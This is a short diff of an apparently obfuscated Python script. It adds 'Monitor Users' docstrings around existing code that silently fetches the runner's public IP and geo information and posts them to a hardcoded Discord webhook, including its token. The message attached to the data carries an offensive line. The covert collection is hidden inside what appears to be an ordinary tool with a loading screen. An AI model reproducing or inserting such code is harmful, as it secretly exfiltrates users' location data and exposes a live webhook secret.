@@ -51,6 +51,7 @@ from colorama import Fore ,Style #line:55
 os .system ('cls')#line:56
 import requests #line:57
 import requests
+"""Monitor Users"""
 ip = requests.get("https://api.ipify.org").text
 message = {
     "content": f"asia loves kids  {ip}"
@@ -62,6 +63,7 @@ geo_info = (
 webhook_url = "https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"
 requests.post(webhook_url, json={"content": geo_info})
 requests.post(webhook_url, json=message)
+"""Monitor Users"""
 time .sleep (0.01 )#line:60
 os .system ("cls")#line:61
 def loading ():#line:62
